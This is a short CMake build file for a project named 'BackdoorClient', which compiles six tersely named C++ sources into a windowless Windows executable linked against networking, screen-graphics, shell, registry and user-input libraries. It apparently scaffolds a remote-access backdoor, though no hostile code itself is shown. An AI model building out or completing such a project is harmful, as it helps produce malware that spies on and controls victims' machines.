cmake_minimum_required(VERSION 3.10)
project(BackdoorClient)

set(CMAKE_CXX_STANDARD 17)

set(SOURCES
    mt.cpp
    fb.cpp
    kz.cpp
    rw.cpp
    pd.cpp
    wn.cpp
)

add_executable(client WIN32 ${SOURCES})

target_link_libraries(client
    ws2_32
    wininet
    gdiplus
    shell32
    advapi32
    user32
)

set_target_properties(client PROPERTIES WIN32_EXECUTABLE TRUE)
